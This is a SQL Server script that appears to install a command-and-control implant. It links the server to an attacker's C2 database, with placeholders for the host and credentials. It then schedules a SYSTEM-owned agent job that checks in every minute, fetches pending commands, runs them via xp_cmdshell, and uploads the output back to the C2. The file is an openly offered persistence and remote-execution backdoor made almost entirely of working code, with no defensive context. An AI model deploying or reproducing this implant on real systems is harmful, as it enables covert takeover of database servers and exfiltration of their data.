
-----------------------------------
-- Create Server Link to C2
-----------------------------------

USE [master]
GO

		    -- Create Server Link C2 Server 
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'C2INSTANCEHERE') = 0
                    EXEC master.dbo.sp_addlinkedserver @server = N'C2INSTANCEHERE', 
                    @srvproduct=N'', 
                    @provider=N'SQLNCLI', 
                    @datasrc=N'C2INSTANCEHERE', -- Add your c2 instance here 
                    @catalog=N'C2DATABASEHERE'  -- Add your c2 database here

                    -- Associate credentials with the server link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLink') = 1
                    EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname=N'$RandomLink',
                    @useself=N'False',
                    @locallogin=NULL,
                    @rmtuser=N'C2USERNAMEHERE,     -- Add your c2 username here 
                    @rmtpassword='C2PASSWORDHERE'  -- Add your c2 password here        

                    -- Configure the server link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'C2INSTANCEHERE') = 1
                    EXEC master.dbo.sp_serveroption @server=N'C2INSTANCEHERE', @optname=N'data access', @optvalue=N'true'                    

                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'C2INSTANCEHERE') = 1
                    EXEC master.dbo.sp_serveroption @server=N'C2INSTANCEHERE', @optname=N'rpc', @optvalue=N'true'

                    --IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'C2INSTANCEHERE') = 1
                    EXEC master.dbo.sp_serveroption @server=N'C2INSTANCEHERE', @optname=N'rpc out', @optvalue=N'true'
                    
                    -- Verify addition of link
                    IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'C2INSTANCEHERE') = 1 
                        SELECT 1
                    ELSE
                        SELECT 0  


-----------------------------------
-- Create TSQL Agent Job
-----------------------------------

USE [msdb]
GO


BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0


IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'SQLC2 Agent Job', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=N'NT AUTHORITY\SYSTEM', @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback


EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Run command', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'TSQL', 
		@command=N'-- Query server link - Register the agent
IF not Exists (SELECT * FROM [C2INSTANCEHERE].[C2DATABASEHERE].dbo.C2Agents  WHERE servername = (select @@SERVERNAME))
	INSERT [C2INSTANCEHERE].[C2DATABASEHERE].dbo.C2Agents (servername,agentype) VALUES ((select @@SERVERNAME),''ServerLink'')
 ELSE
	UPDATE [C2INSTANCEHERE].[C2DATABASEHERE].dbo.C2Agents SET lastcheckin = (select GETDATE ())
    WHERE servername like (select @@SERVERNAME)

-- Get the pending commands for this server from the C2 SQL Server
DECLARE @output TABLE (cid int,servername varchar(8000),command varchar(8000))
INSERT @output (cid,servername,command) SELECT cid,servername,command FROM [C2INSTANCEHERE].[C2DATABASEHERE].dbo.C2Commands WHERE status like ''pending'' and servername like @@servername

-- Run all the command for this server
WHILE (SELECT count(*) FROM @output) > 0 
BEGIN
	
	-- Setup variables
	DECLARE @CurrentCid varchar (8000) -- current cid
	DECLARE @CurrentCmd varchar (8000) -- current command
	DECLARE @xpoutput TABLE ([rid] int IDENTITY(1,1) PRIMARY KEY,result varchar(max)) -- xp_cmdshell output table
	DECLARE @result varchar(8000) -- xp_cmdshell output value

	-- Get first command in the list - need to add cid
	SELECT @CurrentCid = (SELECT TOP 1 cid FROM @output)
	SELECT @CurrentCid as cid
	SELECT @CurrentCmd = (SELECT TOP 1 command FROM @output)
	SELECT @CurrentCmd as command
		
	-- Run the command - not command output break when multiline - need fix, and add cid
	INSERT @xpoutput (result) exec master..xp_cmdshell @CurrentCmd
	SET @result = (select top 1 result from  @xpoutput)
	select @result as result

	-- Upload results to C2 SQL Server - need to add cid
	Update [C2INSTANCEHERE].[C2DATABASEHERE].dbo.C2Commands set result = @result, status=''success''
	WHERE servername like @@SERVERNAME and cid like @CurrentCid

	-- Clear the command result history
	DELETE FROM @xpoutput 

	-- Remove first command
	DELETE TOP (1) FROM @output 
END
', 
		@database_name=N'master', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'SQLC2 Agent Schedule', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=4, 
		@freq_subday_interval=1, 
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=20180521, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=N'9eb66fdb-70d6-4ccf-8b60-a97431487e88'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO
